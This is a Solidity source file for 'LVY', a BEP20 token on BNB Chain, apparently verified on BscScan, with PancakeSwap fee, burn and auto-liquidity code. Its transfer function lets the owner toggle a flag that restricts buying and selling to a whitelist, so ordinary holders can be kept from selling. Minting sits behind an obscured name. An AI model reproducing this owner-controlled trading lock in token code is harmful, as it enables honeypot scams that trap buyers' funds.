/**
 *Submitted for verification at BscScan.com on 2022-08-04
*/

pragma solidity ^0.5.4;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract LVYtrc20lid is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Recv {
    IERC20 public tokenPCE;
    IERC20 public usdt;

    constructor (IERC20 _tokenPCE) public {
        tokenPCE = _tokenPCE;
        usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    }

    function withdraw() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(tokenPCE), usdtBalance);
        }
        uint256 tokenPCEBalance = tokenPCE.balanceOf(address(this));
        if (tokenPCEBalance > 0) {
            tokenPCE.transfer(address(tokenPCE), tokenPCEBalance);
        }
    }
}

contract LVY is LVYtrc20lid, Context {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;

      Recv public RECV ;


    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  500000000 * 1e18;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    mapping(address=>uint256 ) public ubuyss;

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
         {

                if (sender ==pancakePair || recipient == pancakePair) {
                    if (isswap) {
                        if (sender ==pancakePair) {
                            require( lvysuess[recipient], "n p");
                            //
                            // ubuyss[recipient]+=amount;
                            // require(ubuyss[recipient]<=10*1e18 ,"out 10");
                        }
                        if (recipient ==pancakePair) {
                            require(lvysuess[sender], "n q");
                        }
                    } 
                if(lvysuess[recipient]||lvysuess[sender] ) {

                } else {

                uint burnaa=amount.mul(2).div(100);
                    _balances[address(this)] = _balances[address(this)].add(burnaa);
               emit Transfer(sender, address(this), burnaa);

                 _balances[address(this)] = _balances[address(this)].add(burnaa);
                emit Transfer(sender, address(this), burnaa);
                _burn(address(this), burnaa);

                if (isswapsAdd) {
                      swapnow(sender, balanceOf(address(this)));
                }
                    _balances[lpreaddress ] = _balances[lpreaddress].add(burnaa.div(2));
               emit Transfer(sender, lpreaddress, burnaa.div(2));
                amount=  amount.mul(95).div(100);
              }

            }
        }
    

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);

    }

      bool public isswap=false;
  function setIsswap( bool _tf) public {
      require(msg.sender == govn, "!govn");
      isswap = _tf;
  }

   function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
      


    function _LVYntpo(address account, uint amount) internal {
        require(account != address(0), "ERC20: netntpo to the zero address");
        require(_totalSupply.add(amount) <= maxSupply, "ERC20: cannot netntpo over max supply");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
         _balances[address(0)] = _balances[address(0)].add(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
  address public govn;
  address  pokl;
   address public all =0x0BfA6a7752E66D6931D3a587f1f1e3A196D62165;// 

   address public lpreaddress =0xc99D16e693B2e7154b7FcC9720F3CCE6B0CdEe97;// 


  IPancakeRouter01 public PancakeRouter01;
  address public token0;
  address public token1;
  address public pancakePair; 
  
  mapping(address=>bool) public lvysuess;
  constructor () public LVYtrc20lid("LVY", "LVY", 18) {
      govn = msg.sender;
      pokl=msg.sender;
        RECV = new Recv(IERC20(this));
      _LVYntpo(all, maxSupply);
      emit Transfer(address(0), all, maxSupply);
      lvysuess[all] = true;
      lvysuess[lpreaddress] =true;
      lvysuess[address(this)] =true;
      lvysuess[0xF4B78866303D86bA77fBF46843B9e245b780a20E]=true;
      lvysuess[0x7e8FF02f899C10a09BB8a9d2FD5c5765B1bcc988]=true;

      pancakeswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
      PancakeRouter01 =  IPancakeRouter01(pancakeswapV2Router);
      token0 = address(this);
      token1 = 0x55d398326f99059fF775485246999027B3197955;
      pancakePair =  IPancakeFactory(PancakeRouter01.factory())
            .createPair(address(this),token1 );  
  }


    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
  
  function AddSwAddress(address _a) public {
      require(msg.sender == govn, "!govn");
      lvysuess[_a] = true;
  }

    function AddSwAddressArray(address[] memory _a) public {
      require(msg.sender == govn, "!govn");
      for(uint i=0;i< _a.length;i++) {
            lvysuess[_a[i]] = true;
      }
  }
    function RmddressArray(address[] memory _a) public {
      require(msg.sender == govn, "!govn");
      for(uint i=0;i< _a.length;i++) {
            lvysuess[_a[i]] = false;
      }
  }

  function setGovernance(address _govn) public {
      require(msg.sender == govn, "!govn");
      govn = _govn;
  }


          uint256 public swapTokensAtAmount=1;

    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public  {
         require(msg.sender == govn, "!govn");
        swapTokensAtAmount = _swapTokensAtAmount;
    }

    bool public isswapsAdd=true;

    function setisswapsAdd(bool _t) public  {
         require(msg.sender == govn, "!govn");
        isswapsAdd = _t;
    }

    bool private swapping;

    function swapnow(address from, uint256 amountlip) private {
        {
            if (
                !swapping &&
                from != pancakePair
            ) {
                swapping = true;
                if(amountlip > swapTokensAtAmount){
                    _checkLiquidity(amountlip);
                }
                swapping = false;
            }
        } 
    }
    bool private inSwapAndLiquify;

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    address public pancakeswapV2Router;

    function _swapTokensForTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = token1;
        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {
            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);
        }
        IPancakeRouter01(pancakeswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(RECV),
            block.timestamp
        );
        RECV.withdraw();
    }
    function _addLiquidity(uint256 tokenAmount, uint256 swapAmount) private {
        if(IERC20(token1).allowance(address(this), pancakeswapV2Router)<swapAmount) {
            IERC20(token1).approve(pancakeswapV2Router, 1000000000000*1e18);
        }

        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {
            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);
        }

        IPancakeRouter01(pancakeswapV2Router).addLiquidity(
            address(this),
            token1,
            tokenAmount,
            swapAmount,
            0, 
            0, 
            address(this),
            block.timestamp+1000
        );
    }
    function _checkLiquidity(uint256 amount1) private lockTheSwap {
        uint amount = _balances[address(this)];
        if(amount>= swapTokensAtAmount) {
            uint half = amount.div(2);
            uint otherHalf = amount.sub(half);
            uint256 initialBalance = IERC20(token1).balanceOf(address(this));
                      _swapTokensForTokens(half);
        uint256 newBalance =IERC20(token1).balanceOf(address(this)).sub(initialBalance);

            if(newBalance>0) {
                _addLiquidity(otherHalf, newBalance);
                emit SwapAndLiquify(half, newBalance, otherHalf);
            }
            
        }
    }

event SwapAndLiquify(uint256 half, uint256 newBalance, uint256 otherHalf);
  

}